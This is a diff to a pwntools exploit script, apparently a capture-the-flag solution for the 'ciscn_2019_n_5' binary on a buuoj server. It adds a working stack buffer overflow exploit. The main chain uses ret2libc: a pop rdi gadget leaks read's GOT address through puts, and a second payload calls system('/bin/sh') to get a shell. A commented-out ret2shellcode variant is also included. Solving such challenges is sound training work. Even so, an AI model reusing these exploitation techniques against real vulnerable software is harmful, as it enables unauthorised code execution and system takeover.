@@ -28,12 +28,31 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context(arch='amd64', os='linux', log_level = 'DEBUG')
-binary = './pwn'
+binary = './ciscn_2019_n_5'
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',27225) if argv[1]=='r' else process(binary)
 
 # start
+sla('name\n', 'merc')
+pop_rdi = 0x400713
+payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['main'])
+ru('me?\n')
+sl(payload)
+read = uu64(r(6))
+leak('read',read)
+sla('name\n', 'merc')
+system, binsh = ret2libc(read,'read')
+payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)
+sla('me?\n', payload)
+# end
 
+# OR ret2shellcode
+# start
+# sla('name\n', asm(shellcraft.sh()))
+# payload = flat('a'*0x28,0x601080)
+# ru('me?\n')
+# sl(payload)
 # end
 
 itr()
